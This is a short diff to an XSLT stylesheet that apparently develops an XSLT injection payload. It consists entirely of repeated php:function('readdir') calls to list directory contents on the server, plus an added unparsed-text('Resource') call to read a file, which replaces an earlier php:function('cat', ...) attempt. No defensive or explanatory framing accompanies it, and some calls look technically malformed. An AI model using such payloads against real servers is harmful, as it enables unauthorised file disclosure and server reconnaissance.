@@ -13,7 +13,13 @@
 <xsl:value-of select="php:function('readdir')"/>
 <xsl:value-of select="php:function('readdir')"/>
 <xsl:value-of select="php:function('readdir')"/>
-<xsl:value-of select="php:function('cat','Resource')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:sequence select="unparsed-text('Resource')"/>
 </body>
 </html> 
 
